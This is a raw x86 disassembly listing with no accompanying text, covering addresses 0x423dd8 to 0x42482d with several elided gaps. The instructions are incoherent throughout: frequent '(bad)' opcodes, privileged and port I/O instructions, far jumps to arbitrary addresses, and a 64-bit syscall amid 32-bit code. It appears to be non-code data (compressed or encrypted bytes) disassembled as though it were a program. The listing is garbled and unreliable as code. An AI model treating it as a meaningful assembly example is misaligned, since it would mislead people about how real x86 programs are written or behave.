  423dd8:	mov    ecx,0xf0cbc8f2
  423ddd:	aaa    
  423dde:	in     al,0xff
  423de0:	mov    ds:0xadde151e,eax
  423de5:	push   esp
  423de6:	inc    ecx
  423de7:	jns    0x423dd8
  423de9:	sub    eax,0x4f5ca552
  423dee:	shl    BYTE PTR [edx+0x7aac8536],0x20
  423df5:	shl    BYTE PTR [ebx+eax*1],cl
  423df8:	pusha  
  423df9:	inc    ebp
  423dfa:	xchg   esi,eax
  423dfb:	xor    bh,cl
  423dfd:	test   DWORD PTR [eax],esi
  423dff:	xor    eax,DWORD PTR [ebx+ebx*8-0x4f]
  423e03:	adc    eax,0xbbf92c7b
  423e08:	aam    0xbe
  423e0a:	mov    ecx,0x57cf6c99
  423e0f:	ror    BYTE PTR [ebx],1
  423e11:	pop    edi
  423e12:	scas   al,BYTE PTR es:[edi]
  423e13:	imul   eax,DWORD PTR [esi-0x70ce7ade],0xfffffff0
  423e1a:	pop    edi
  423e1b:	pop    ss
  423e1c:	xor    al,0x26
  423e1e:	test   DWORD PTR [eax-0x27684b35],eax
  423e24:	lahf   
  423e25:	mov    al,0x86
  423e27:	pop    esi
  423e28:	pop    ecx
  423e29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e2a:	mov    al,0xc8
  423e2c:	pop    ebp
  423e2d:	sbb    eax,0x38ebd879
  423e32:	das    
  423e33:	cdq    
  423e34:	dec    esp
  423e35:	mov    edi,0x49849371
  423e3a:	mov    DWORD PTR [ebp-0x8],esp
  423e3d:	pop    ebx
  423e3e:	add    esp,DWORD PTR [edx+0x7ee02ce0]
  423e44:	pop    esi
  423e45:	inc    ebx
  423e46:	push   ebx
  423e47:	comiss xmm4,DWORD PTR [ebx-0xcedabe3]
  423e4e:	sub    eax,DWORD PTR [edi-0x4]
  423e51:	inc    edx
  423e52:	loopne 0x423e9f
  423e54:	je     0x423e27
  423e56:	retf   
  423e57:	jp     0x423df7
  423e59:	call   0xcb34e8cf
  423e5e:	icebp  
  423e5f:	add    al,ah
  423e61:	push   esi
  423e62:	adc    BYTE PTR [edx-0x2c],cl
  423e65:	bound  edi,QWORD PTR [eax+0x2f]
  423e68:	push   edi
  423e69:	test   ebp,eax
  423e6b:	stos   BYTE PTR es:[edi],al
  423e6c:	xchg   ecx,eax
  423e6d:	xor    esp,DWORD PTR [eax]
  423e6f:	fmul   st(5),st
  423e71:	xor    BYTE PTR [eax],dh
  423e73:	fadd   DWORD PTR [edi-0x3a00cb54]
  423e79:	jle    0x423e49
  423e7b:	mov    eax,0x8ee27b83
  423e80:	dec    esp
  423e81:	mov    cl,0xcc
  423e83:	mov    eax,0x9d0281fa
  423e88:	xor    eax,DWORD PTR [ebp-0x856c5e3]
  423e8e:	syscall 
  423e90:	leave  
  423e91:	popf   
  423e92:	scas   eax,DWORD PTR es:[edi]
  423e93:	pop    ds
  423e94:	int3   
  423e95:	and    al,0xf9
  423e97:	retf   0x2975
  423e9a:	push   ds
  423e9b:	jp     0x423e72
  423e9d:	add    BYTE PTR [esi+0x55187e50],ah
  423ea3:	mov    cl,0x0
  423ea5:	out    dx,eax
  423ea6:	dec    esi
  423ea8:	fcom   DWORD PTR [ebp+0x731356cc]
  423eae:	retf   
  423eaf:	push   edx
  423eb0:	jo     0x423e82
  423eb2:	out    dx,al
  423eb3:	jae    0x423e48
	...
  423f15:	add    BYTE PTR [esi+0x74b9649a],ch
  423f1b:	(bad)  
  423f1c:	call   FWORD PTR [edi+0x5086f531]
  423f22:	fbstp  TBYTE PTR [esp+esi*2-0x5a]
  423f26:	call   0x1:0x700017e
  423f2d:	add    BYTE PTR [ecx-0x4a6fa896],bh
  423f33:	adc    BYTE PTR [eax+0x37],dh
  423f36:	pmaddwd mm4,QWORD PTR [ebx+0x72]
  423f3a:	xchg   ebx,eax
  423f3b:	or     eax,esi
  423f3d:	sub    BYTE PTR [ecx],dl
  423f3f:	enter  0xa589,0x84
  423f43:	mov    DWORD PTR [esi-0x17],edx
  423f46:	test   al,bh
  423f48:	push   esi
  423f49:	cmp    DWORD PTR [ebx],ecx
  423f4b:	vaddss xmm6,xmm0,xmm0
  423f4f:	ficom  WORD PTR [ebp+edx*2-0x29]
  423f53:	cmp    al,0x49
  423f55:	outs   dx,BYTE PTR ds:[esi]
  423f56:	(bad)  
  423f57:	imul   edi,DWORD PTR [edx-0x4d8fd82f],0x4c57d2f9
  423f61:	push   ebp
  423f62:	mul    eax
  423f64:	imul   bh
  423f66:	jae    0x423f35
  423f68:	push   esi
  423f69:	inc    edx
  423f6a:	js     0x423f15
  423f6c:	cli    
  423f6d:	sbb    BYTE PTR ds:0x9d223820,dh
  423f73:	push   ss
  423f74:	sub    eax,0x949f58f7
  423f79:	mov    esp,0x61b7b330
  423f7e:	gs icebp 
  423f80:	fmul   DWORD PTR [ebp+0x29174e66]
  423f86:	mov    DWORD PTR [ebp+0x35],esi
  423f89:	int    0x64
  423f8b:	imul   ecx,edx,0xffffffa7
  423f8e:	aad    0x7a
  423f90:	mov    cl,0xf6
  423f92:	adc    BYTE PTR [edi],0xef
  423f95:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423f97:	(bad)  
  423f98:	push   esp
  423f99:	inc    ebp
  423f9a:	pop    esp
  423f9b:	shr    bh,cl
  423f9d:	lds    edi,FWORD PTR [ecx-0x59]
  423fa0:	push   eax
  423fa1:	push   edx
  423fa2:	xchg   edx,eax
  423fa3:	dec    edx
  423fa4:	inc    edx
  423fa5:	stos   DWORD PTR es:[edi],eax
  423fa6:	stos   DWORD PTR es:[edi],eax
  423fa7:	xchg   BYTE PTR [ecx-0x4267eff6],ah
  423fad:	out    0x3e,al
  423faf:	jae    0x423f63
  423fb1:	mov    edi,gs
  423fb3:	inc    ebp
  423fb4:	int3   
  423fb5:	pushf  
  423fb6:	lock cmp DWORD PTR [ecx+0xf],esi
  423fba:	call   0xd8f7:0xb753209d
  423fc1:	aaa    
  423fc2:	fld    TBYTE PTR [ecx+0x12d28fd9]
  423fc8:	rcl    DWORD PTR [esi-0xc82dd2d],0x6
  423fcf:	std    
  423fd0:	pop    edi
  423fd1:	sub    al,0x57
  423fd3:	jp     0x423f72
  423fd5:	loope  0x424009
  423fd7:	jle    0x424006
  423fd9:	les    ecx,FWORD PTR [ebp-0x44d41cc1]
  423fdf:	pop    ebx
  423fe0:	sbb    al,0x26
  423fe2:	stos   DWORD PTR es:[edi],eax
  423fe3:	aam    0x30
  423fe5:	mov    fs,WORD PTR [edi]
  423fe7:	(bad)  
  423fe8:	sub    esi,ecx
  423fea:	icebp  
  423feb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423fec:	test   al,0xe1
  423fee:	repz sti 
  423ff0:	mov    ch,0x39
  423ff2:	(bad)  
  423ff3:	stos   DWORD PTR es:[edi],eax
  423ff4:	adc    al,0xf0
  423ff6:	jbe    0x423fc9
  423ff8:	les    edx,FWORD PTR [eax+eax*1]
  423ffb:	test   DWORD PTR [esi-0x8909872],edx
  424001:	shl    DWORD PTR [edi],cl
  424003:	pop    ebp
  424004:	(bad)  
  424006:	sbb    al,0xbf
  424008:	fwait
  424009:	dec    edi
  42400a:	pop    ds
  42400b:	nop
  42400c:	mov    al,0x43
  42400e:	adc    al,0x79
  424010:	aas    
  424011:	cdq    
  424012:	pop    ecx
  424013:	sbb    al,0x3
  424015:	sbb    ebp,DWORD PTR [eax-0x2c1c2af2]
  42401b:	xchg   esi,eax
  42401c:	loop   0x424075
  42401e:	paddsw mm5,mm5
  424021:	add    esp,eax
  424023:	mov    BYTE PTR [edi-0x5b98c003],ah
  424029:	pop    ebp
  42402a:	jmp    0xf93f:0x88fff902
  424031:	xchg   ebp,eax
  424032:	dec    ecx
  424033:	mov    ds:0xa1,eax
	...
  424094:	add    BYTE PTR [eax],al
  424096:	jl     0x4240f0
  424098:	cs mov cl,0x2e
  42409b:	idiv   edi
  42409d:	fnsave [edi-0x3255e30f]
  4240a3:	lock imul esi,DWORD PTR [ebp-0x5f],0x7f
  4240a8:	add    DWORD PTR [eax],eax
  4240aa:	pop    es
  4240ab:	add    DWORD PTR [eax],eax
  4240ad:	add    bl,ah
  4240af:	inc    ecx
  4240b0:	cli    
  4240b1:	cs mov ah,0xa5
  4240b4:	(bad)  
  4240b5:	xchg   ebp,eax
  4240b6:	sub    BYTE PTR [ebx+0x78],ch
  4240b9:	dec    ebp
  4240ba:	in     eax,dx
  4240bb:	ss push ecx
  4240bd:	adc    al,0x6d
  4240bf:	xchg   edi,eax
  4240c0:	cmp    eax,0x958aa0f8
  4240c5:	adc    ebx,ebx
  4240c7:	fucomip st,st(3)
  4240c9:	mov    ds:0x5fbd1a25,al
  4240ce:	int3   
  4240cf:	or     al,0x77
  4240d1:	shr    DWORD PTR [ebx+0xd03be80],cl
  4240d7:	inc    esi
  4240d8:	cli    
  4240d9:	xlat   BYTE PTR ds:[ebx]
  4240da:	add    eax,0xf9f19819
  4240df:	cmp    edi,DWORD PTR [ebx+0x28]
  4240e2:	aas    
  4240e3:	and    al,0x2f
  4240e5:	aad    0xee
  4240e7:	push   esp
  4240e8:	cmp    BYTE PTR [ecx+edx*8+0xd],bl
  4240ec:	or     BYTE PTR [ebx-0xd],cl
  4240ef:	pop    ecx
  4240f0:	mov    cl,0x85
  4240f2:	dec    edi
  4240f3:	sbb    BYTE PTR [esi+0x50],cl
  4240f6:	lods   eax,DWORD PTR ds:[esi]
  4240f7:	mov    dl,0xc5
  4240f9:	imul   eax,DWORD PTR [esi+0x21],0x5d98beed
  424100:	sti    
  424101:	ficomp DWORD PTR ds:0x7b63216
  424107:	imul   DWORD PTR [ecx]
  424109:	adc    cl,0x22
  42410c:	push   es
  42410d:	and    ebx,esi
  42410f:	xor    ebp,DWORD PTR [ebx]
  424111:	test   al,0x17
  424113:	dec    edx
  424115:	cmp    DWORD PTR ds:0xee85e14a,esi
  42411b:	xor    DWORD PTR [eax+edx*2+0x53f54049],eax
  424122:	int    0xe8
  424124:	xchg   DWORD PTR [ebx],eax
  424126:	xchg   BYTE PTR [esp+ebp*1-0x16],dh
  42412a:	add    al,0x3a
  42412c:	jmp    0x424107
  42412e:	jo     0x4240ba
  424130:	and    al,0xea
  424132:	pop    ebx
  424133:	cmp    BYTE PTR [ecx],bl
  424135:	add    dh,dl
  424137:	scas   al,BYTE PTR es:[edi]
  424138:	sub    edi,esp
  42413a:	lods   al,BYTE PTR ds:[esi]
  42413b:	jmp    0xe41477f0
  424140:	or     al,0x29
  424142:	and    eax,0x990d57f
  424147:	int    0xeb
  424149:	int    0xc5
  42414b:	repz in al,dx
  42414d:	(bad)  
  42414e:	mov    ah,0xe7
  424150:	inc    esp
  424151:	xor    dl,bh
  424153:	aas    
  424154:	nop
  424155:	pusha  
  424156:	jb     0x4241a9
  424158:	mov    edx,0x650ad782
  42415d:	xor    DWORD PTR [ecx+0x6c],esp
  424160:	popa   
  424161:	add    al,0x8a
  424163:	out    dx,eax
  424164:	jnp    0x42413e
  424166:	inc    esp
  424167:	imul   esi,edi,0x6d
  42416a:	and    al,0xec
  42416c:	into   
  42416d:	mov    ecx,0x5e1c1b45
  424172:	and    BYTE PTR [eax+0x22],cl
  424175:	xchg   ebp,eax
  424176:	sahf   
  424177:	push   edx
  424178:	sub    ebp,ebx
  42417a:	ins    DWORD PTR es:[edi],dx
  42417b:	mov    ds:0xa6b6718,eax
  424180:	fimul  DWORD PTR [ecx-0x4b95a6af]
  424186:	cmp    al,0x94
  424188:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424189:	mov    ds:0xf9fa2371,eax
  42418e:	arpl   WORD PTR [edx],bx
  424190:	mov    eax,ds:0xfd903d2c
  424195:	xlat   BYTE PTR ds:[ebx]
  424196:	sbb    esp,0x74
  424199:	xlat   BYTE PTR ds:[ebx]
  42419a:	in     al,0x63
  42419c:	xchg   ecx,eax
  42419d:	mov    esp,DWORD PTR [esi+0x4d90bc75]
  4241a3:	vpsllq xmm6,xmm7,xmm1
  4241a7:	xor    eax,DWORD PTR [esp+eax*2+0x12]
  4241ab:	jns    0x424221
  4241ad:	inc    esi
  4241ae:	adc    eax,0xe2f79631
  4241b3:	xchg   edi,eax
  4241b4:	jg     0x4241b6
	...
  424216:	xchg   DWORD PTR [ebx+eiz*4-0x204c28],esi
  42421d:	call   DWORD PTR [edi+0x4ed4b417]
  424223:	pop    es
  424224:	cwde   
  424225:	in     eax,0xa8
  424227:	add    BYTE PTR [ecx],0x0
  42422a:	pop    es
  42422b:	add    DWORD PTR [eax],eax
  42422d:	add    al,bh
  42422f:	sub    cl,bh
  424231:	cmp    DWORD PTR ds:0x6a4349e,0xbe28cc75
  42423b:	mov    ah,0xcb
  42423d:	pop    esi
  42423e:	push   edi
  42423f:	or     al,bl
  424241:	fldcw  WORD PTR [ecx]
  424243:	and    ah,dl
  424245:	fld    TBYTE PTR [esi]
  424247:	xor    eax,0x3549f522
  42424c:	mov    ebx,0xa1db9fd1
  424251:	jge    0x424209
  424253:	dec    ebx
  424254:	les    esi,FWORD PTR [esi+esi*2+0xc]
  424258:	scas   al,BYTE PTR es:[edi]
  424259:	fwait
  42425a:	out    dx,eax
  42425b:	fdiv   DWORD PTR [edi+esi*1]
  42425e:	in     al,0x91
  424260:	and    eax,0xe24eb6bf
  424265:	jae    0x424227
  424267:	popf   
  424268:	aaa    
  424269:	fnstcw WORD PTR ds:0xddf898bd
  42426f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424270:	pop    ecx
  424271:	js     0x424268
  424273:	mov    eax,ds:0xaa0307d9
  424278:	and    BYTE PTR [edi],bl
  42427a:	int3   
  42427b:	(bad)  
  42427c:	push   eax
  42427d:	fwait
  42427e:	retf   
  42427f:	sbb    al,0x7c
  424281:	lahf   
  424282:	out    dx,eax
  424283:	mov    eax,ds:0xea22653c
  424288:	out    dx,al
  424289:	mov    gs,WORD PTR [eax]
  42428b:	jo     0x424227
  42428d:	inc    ecx
  42428e:	cmp    dl,dl
  424290:	push   es
  424291:	sbb    al,0x8
  424293:	push   cs
  424294:	outs   dx,BYTE PTR ds:[esi]
  424295:	push   cs
  424296:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424297:	je     0x42428f
  424299:	fidivr DWORD PTR [eax-0x5f]
  42429c:	mov    bl,0x43
  42429e:	retf   0x6f7e
  4242a1:	adc    eax,0x99e9cac2
  4242a6:	jge    0x42422c
  4242a8:	and    ebp,ecx
  4242aa:	or     dl,BYTE PTR [eax]
  4242ac:	jb     0x4242bc
  4242ae:	or     cl,BYTE PTR [edx]
  4242b0:	pop    esp
  4242b1:	pop    ebp
  4242b2:	enter  0x8ecd,0x54
  4242b6:	in     eax,dx
  4242b7:	mov    al,0x20
  4242b9:	imul   ebp,DWORD PTR [eax+0x6e96f926],0x8b1f370d
  4242c3:	aad    0x98
  4242c5:	retf   0x93f7
  4242c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4242c9:	sbb    DWORD PTR [esi-0x31],esi
  4242cc:	icebp  
  4242cd:	mov    bl,0xcf
  4242cf:	enter  0xde20,0x66
  4242d3:	icebp  
  4242d4:	outs   dx,DWORD PTR ds:[esi]
  4242d5:	cmp    ah,BYTE PTR [eax]
  4242d7:	addr16 nop
  4242d9:	ja     0x4242ff
  4242db:	mov    ds:0x51d4dc2,al
  4242e0:	clc    
  4242e1:	rcr    cl,cl
  4242e3:	cmp    edx,DWORD PTR [ebp+0x7c49e681]
  4242e9:	add    esi,DWORD PTR [esi]
  4242eb:	shr    DWORD PTR [esi+0x2a55e3fe],0xc8
  4242f2:	mov    ds:0x64e43fdd,al
  4242f7:	imul   ebx,DWORD PTR [edx+0x5278bdd3],0x47a3dd2
  424301:	push   eax
  424302:	cmp    al,0xb4
  424304:	push   esp
  424305:	mov    ah,bh
  424307:	outs   dx,BYTE PTR ds:[esi]
  424308:	and    DWORD PTR ds:0xd034a9dc,ecx
  42430e:	jne    0x424388
  424310:	and    edx,DWORD PTR [edi+0x1a4ab810]
  424316:	retf   0x6877
  424319:	pop    esi
  42431a:	fcom   st(3)
  42431c:	aad    0x0
  42431e:	pop    esi
  42431f:	jge    0x42430c
  424321:	mov    esi,0xa01fec17
  424326:	fstp   DWORD PTR gs:[ebx+0x44b7e410]
  42432d:	mov    ebx,0x766a6baa
  424332:	or     bh,dl
  424334:	aas    
	...
  424395:	add    BYTE PTR [edx-0x24582da],cl
  42439b:	sti    
  42439c:	iret   
  42439d:	test   DWORD PTR ss:[ebx],ebx
  4243a0:	sub    edx,ebp
  4243a2:	sahf   
  4243a3:	arpl   WORD PTR [ebx+0x30],bx
  4243a6:	scas   eax,DWORD PTR es:[edi]
  4243a7:	add    DWORD PTR [ecx],0x10700
  4243ad:	add    BYTE PTR [ebp-0x36],bh
  4243b0:	pop    es
  4243b1:	sbb    ebx,DWORD PTR [edi-0x5180ef51]
  4243b7:	arpl   cx,sp
  4243b9:	xchg   ebx,eax
  4243ba:	aaa    
  4243bb:	loope  0x42441b
  4243bd:	test   DWORD PTR [ecx-0xfa6fb5c],edx
  4243c3:	daa    
  4243c4:	push   esp
  4243c5:	gs jo  0x42436c
  4243c8:	xchg   esi,eax
  4243c9:	pop    ss
  4243ca:	xchg   esp,eax
  4243cb:	xor    al,dh
  4243cd:	jle    0x424405
  4243cf:	int    0x6c
  4243d1:	and    eax,0x943b477c
  4243d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4243d8:	cmp    BYTE PTR [edx-0x5b2e4730],bl
  4243de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4243df:	mov    eax,0x9bd478bb
  4243e4:	(bad)  
  4243e5:	adc    dl,BYTE PTR [ebp+0x1ffe0f38]
  4243eb:	into   
  4243ec:	lds    edi,FWORD PTR [eax]
  4243ee:	mov    eax,0x5c6b8a29
  4243f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4243f4:	xor    ch,ch
  4243f6:	ror    DWORD PTR [ecx+edx*2],cl
  4243f9:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4243fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4243fc:	call   0x3d61:0x3b66f7ce
  424403:	pop    ebp
  424404:	dec    ecx
  424405:	popf   
  424406:	mov    edx,0x9b6f657c
  42440b:	xchg   ebp,eax
  42440c:	xchg   BYTE PTR [edi-0x4263fa69],ah
  424412:	addps  xmm1,XMMWORD PTR [ecx]
  424415:	mov    ebx,edx
  424417:	nop
  424418:	jg     0x4243a2
  42441a:	push   edi
  42441b:	retf   0xa9ea
  42441e:	inc    edx
  42441f:	xor    al,0x3f
  424421:	aam    0xaa
  424423:	shr    DWORD PTR [esi+0x738803cf],1
  424429:	sbb    al,0x92
  42442b:	xchg   edx,ecx
  42442d:	pop    esp
  42442e:	lods   al,BYTE PTR ds:[esi]
  42442f:	xor    edi,DWORD PTR ds:0xbb5df4b0
  424435:	pop    edx
  424436:	aad    0xd6
  424438:	fcom   st(2)
  42443a:	dec    edi
  42443b:	ss jecxz 0x42448e
  42443e:	bswap  ebx
  424440:	(bad)  
  424442:	pop    esi
  424443:	sbb    eax,0x45137bbf
  424448:	(bad)  
  42444a:	pop    ebx
  42444b:	cdq    
  42444c:	add    edx,ebp
  42444e:	and    ebx,DWORD PTR [edi+0x4f69f7e5]
  424454:	ins    DWORD PTR es:[edi],dx
  424455:	lahf   
  424456:	outs   dx,DWORD PTR ds:[esi]
  424457:	jle    0x4244d1
  424459:	mov    al,0xc8
  42445b:	jmp    0x33d762e7
  424460:	ins    DWORD PTR es:[edi],dx
  424461:	les    edx,FWORD PTR [edi]
  424463:	pusha  
  424464:	xor    BYTE PTR [ecx],bh
  424466:	adc    ebx,edx
  424468:	es push eax
  42446a:	fistp  DWORD PTR [bp+si]
  42446d:	aam    0xaf
  42446f:	arpl   WORD PTR [ebx],di
  424471:	cld    
  424472:	arpl   WORD PTR [edx+0x4d27af13],bx
  424478:	or     BYTE PTR [eax+0x45bf7df0],dh
  42447e:	xchg   BYTE PTR [edx+0x72be8ea5],dh
  424484:	or     ch,BYTE PTR [edi]
  424486:	pop    sp
  424488:	fimul  DWORD PTR [esp+ebx*2]
  42448b:	rcl    al,cl
  42448d:	addr16 cs cmc 
  424490:	idiv   eax
  424492:	into   
  424493:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424494:	leave  
  424495:	mov    bl,0xf1
  424497:	clc    
  424498:	add    BYTE PTR [edi+0x466f5c7a],ah
  42449e:	cs fucomip st,st(6)
  4244a1:	push   0xe63b5815
  4244a6:	add    eax,0xd64f22fe
  4244ab:	xor    bh,BYTE PTR [ebx]
  4244ad:	ja     0x424431
  4244af:	pop    ss
  4244b0:	jmp    0x4244e7
  4244b2:	push   ds
  4244b3:	jb     0x424448
	...
  424515:	add    al,ah
  424517:	outs   dx,DWORD PTR ds:[esi]
  424518:	xchg   esi,eax
  424519:	inc    edx
  42451a:	lahf   
  42451b:	sti    
  42451c:	hlt    
  42451d:	out    dx,eax
  42451e:	mov    al,ds:0xba0ff3ab
  424523:	cmc    
  424524:	mov    ds:0x182b6c9,al
  424529:	add    BYTE PTR [edi],al
  42452b:	add    DWORD PTR [eax],eax
  42452d:	add    BYTE PTR [ebx-0x35],ah
  424530:	lahf   
  424531:	cdq    
  424532:	ins    BYTE PTR es:[edi],dx
  424533:	jge    0x4244d9
  424535:	mov    cl,0x4c
  424537:	jo     0x424534
  424539:	data16 js 0x4245b2
  42453c:	test   BYTE PTR [edi],cl
  42453e:	aas    
  42453f:	mov    dh,0xc9
  424541:	push   ecx
  424542:	idiv   BYTE PTR [ebp+0x6f]
  424545:	pop    bx
  424547:	or     ebx,ebp
  424549:	(bad)  
  42454a:	mov    ebx,0xe44dc54
  42454f:	dec    edi
  424550:	fdivr  QWORD PTR [esi+ebx*4+0x49]
  424554:	pop    ecx
  424555:	pop    es
  424556:	iret   
  424557:	jo     0x4245c7
  424559:	inc    edx
  42455a:	fnstenv [edx-0x22]
  42455d:	test   al,0xe1
  42455f:	test   al,0xef
  424561:	jecxz  0x4245b4
  424563:	mov    WORD PTR ds:0x3bba371,ss
  424569:	add    BYTE PTR [esi-0x6b],dl
  42456c:	les    eax,FWORD PTR ss:[edi-0x1c]
  424570:	cmp    BYTE PTR [ebx-0x14],bl
  424573:	mov    dl,0xb8
  424575:	outs   dx,DWORD PTR ds:[esi]
  424576:	lock mov edx,0xdb77be54
  42457c:	ss jp  0x4245c2
  42457f:	int3   
  424580:	adc    edi,DWORD PTR [ebx+0x3982b1f3]
  424586:	aas    
  424587:	adc    eax,0x10
  42458a:	dec    eax
  42458b:	or     al,0xbb
  42458d:	xor    al,0x6
  42458f:	push   edx
  424590:	sub    eax,0x1ac129dc
  424595:	lods   eax,DWORD PTR ds:[esi]
  424596:	scas   eax,DWORD PTR es:[edi]
  424597:	gs and eax,0x8a27a35f
  42459d:	mov    ebp,0x1bc009de
  4245a2:	retf   0x1d52
  4245a5:	pop    esi
  4245a6:	scas   eax,DWORD PTR es:[edi]
  4245a7:	pop    ebx
  4245a8:	rcr    BYTE PTR [ebx],0xb6
  4245ab:	and    BYTE PTR [eax+0x5f71d2ec],ch
  4245b1:	into   
  4245b2:	or     al,BYTE PTR [edi-0x52ccc27d]
  4245b8:	ret    0x63d4
  4245bb:	xor    DWORD PTR [edi+0x7dece309],eax
  4245c1:	jmp    0xf8cb03a3
  4245c6:	mov    ecx,0xe9bbed45
  4245cb:	ins    BYTE PTR es:[edi],dx
  4245cc:	into   
  4245cd:	xor    DWORD PTR [ecx-0x43],edi
  4245d0:	retf   
  4245d1:	mov    dh,0x8d
  4245d3:	or     BYTE PTR [ecx-0x79],bl
  4245d6:	push   eax
  4245d7:	cmc    
  4245d8:	fs (bad) 
  4245da:	xacquire xchg BYTE PTR [ecx],dh
  4245dd:	out    dx,al
  4245de:	aam    0xb6
  4245e0:	pop    ebp
  4245e1:	jge    0x424599
  4245e3:	psraw  mm4,QWORD PTR [ebx]
  4245e6:	retf   
  4245e7:	ins    DWORD PTR es:[edi],dx
  4245e8:	in     eax,0xe3
  4245ea:	pop    ss
  4245eb:	jecxz  0x42458d
  4245ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245ee:	inc    eax
  4245ef:	xchg   esi,eax
  4245f0:	in     eax,0xb5
  4245f2:	sub    al,0xcb
  4245f4:	jmp    0x95093e64
  4245f9:	pop    ecx
  4245fa:	outs   dx,DWORD PTR ds:[esi]
  4245fb:	fcmovu st,st(1)
  4245fd:	scas   eax,DWORD PTR es:[edi]
  4245fe:	pop    edi
  4245ff:	mov    ds:0x9b4a0a44,al
  424604:	cmp    eax,0xb241b085
  424609:	push   cs
  42460a:	cmp    DWORD PTR [ebp+0x6411980d],0x3e
  424611:	xor    BYTE PTR [edi+0x3],cl
  424614:	push   ss
  424615:	sbb    al,0xbd
  424617:	pushf  
  424618:	pop    ss
  424619:	pop    ebp
  42461a:	xchg   ebx,eax
  42461b:	fwait
  42461c:	jge    0x4245dc
  42461e:	sbb    al,0xae
  424620:	pop    esi
  424621:	out    0x24,eax
  424623:	popa   
  424624:	lods   eax,DWORD PTR ds:[esi]
  424625:	xor    eax,0x891f6e28
  42462b:	and    DWORD PTR [ebx-0x23],ebx
  42462e:	mov    eax,ds:0x87b677b3
  424633:	xor    eax,DWORD PTR es:[eax]
	...
  424696:	mov    esp,0xfefffc92
  42469b:	(bad)  
  42469c:	mov    edi,0x8f38d4d3
  4246a1:	cmp    edx,DWORD PTR [edx-0x429d08e9]
  4246a7:	add    DWORD PTR [ecx],0x0
  4246aa:	pop    es
  4246ab:	add    DWORD PTR [eax],eax
  4246ad:	add    BYTE PTR [ecx+0x7f8e7416],dh
  4246b3:	xchg   edx,eax
  4246b4:	and    eax,edi
  4246b6:	std    
  4246b7:	test   BYTE PTR [ebx-0x73a6abb3],dl
  4246bd:	aad    0x86
  4246bf:	rcr    esi,1
  4246c1:	xor    ah,BYTE PTR ds:0xacb3a20e
  4246c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4246c8:	cmp    eax,0x41c27b4
  4246cd:	test   eax,0xd8fa27f0
  4246d2:	test   BYTE PTR [ecx],ch
  4246d4:	mov    edi,0x4bc51bb6
  4246d9:	mov    esp,0xbdff265
  4246de:	getsec 
  4246e0:	adc    bh,BYTE PTR [ecx+0x26]
  4246e3:	push   0x2716802c
  4246e8:	or     ch,bl
  4246ea:	pop    esi
  4246eb:	in     eax,dx
  4246ec:	call   0x3a248631
  4246f1:	push   edi
  4246f2:	fdiv   DWORD PTR ds:[ecx+0x3fda8fe]
  4246f9:	es aam 0x32
  4246fc:	push   ds
  4246fd:	pop    es
  4246fe:	mov    dl,0x5b
  424700:	dec    ecx
  424701:	rcl    DWORD PTR [ebx+0x6456476a],cl
  424707:	jae    0x424707
  424709:	adc    eax,0xb52abf4f
  42470e:	mov    edi,0xe34c1146
  424713:	inc    edx
  424714:	xchg   edx,eax
  424715:	pushf  
  424716:	mov    cl,0xa7
  424718:	mov    bl,0xfc
  42471a:	push   0xffffff9f
  42471c:	push   ecx
  42471d:	mov    edx,0xb4a44994
  424722:	mov    ch,0x3f
  424724:	test   al,0xaf
  424726:	cmp    ecx,DWORD PTR [edx+ebp*1-0x347089b3]
  42472d:	dec    ecx
  42472e:	and    eax,0xd28c6232
  424733:	jmp    0x6eff:0xb71eb1f7
  42473a:	or     ch,bh
  42473c:	in     eax,0x8
  42473e:	xlat   BYTE PTR ds:[ebx]
  42473f:	sbb    bl,dh
  424741:	mov    eax,ds:0xf0d26d3b
  424746:	(bad)  
  424747:	pop    ebx
  424748:	mov    ecx,0xe5b9f696
  42474d:	dec    ebx
  42474e:	ds pop ecx
  424750:	test   DWORD PTR [ecx],ecx
  424752:	fbld   TBYTE PTR [eax-0x69]
  424755:	add    BYTE PTR ds:0x1607a0e7,ch
  42475b:	mov    ecx,0xac9cd80
  424760:	mov    edx,0x2461ec4d
  424765:	pop    ebp
  424766:	lea    esi,ds:0xb085
  42476b:	loop   0x424797
  42476d:	push   cs
  42476e:	loopne 0x42475a
  424770:	ja     0x4247db
  424772:	ins    BYTE PTR es:[edi],dx
  424773:	je     0x4247e2
  424775:	inc    edi
  424776:	xlat   BYTE PTR ds:[ebx]
  424777:	xor    dl,BYTE PTR [edi-0x6482a878]
  42477d:	cmp    DWORD PTR [ebp-0x5aa7200d],ebp
  424783:	retf   0xc3f1
  424786:	push   ecx
  424787:	dec    esi
  424788:	dec    esp
  424789:	mul    DWORD PTR [eax+eiz*4-0x7548f2e9]
  424790:	add    DWORD PTR [edi+0x47],ebx
  424793:	cmc    
  424794:	icebp  
  424795:	rcr    BYTE PTR [ecx-0x499386f],1
  42479b:	cmc    
  42479c:	scas   al,BYTE PTR es:[edi]
  42479d:	outs   dx,DWORD PTR ds:[esi]
  42479e:	mov    cl,0xa1
  4247a0:	sub    eax,DWORD PTR [ecx+esi*1]
  4247a3:	add    BYTE PTR [ebp+0x6d19a739],0xed
  4247aa:	jl     0x4247b0
  4247ac:	add    ebx,esp
  4247ae:	shr    DWORD PTR [eax],cl
  4247b0:	xor    al,0x61
  4247b2:	clc    
  4247b3:	test   al,0x9a
	...
  424815:	add    BYTE PTR [edx],ah
  424817:	pop    eax
  424818:	test   bh,ch
  42481a:	(bad)  
  42481b:	jmp    FWORD PTR [ebx-0x23]
  42481e:	rol    DWORD PTR [eax-0x68db07de],0xc7
  424825:	mov    esp,es
  424827:	test   BYTE PTR [ecx],al
  424829:	add    BYTE PTR [edi],al
  42482b:	add    DWORD PTR [eax],eax
  42482d:	add    BYTE PTR [eax-0x4e256ab8],dl
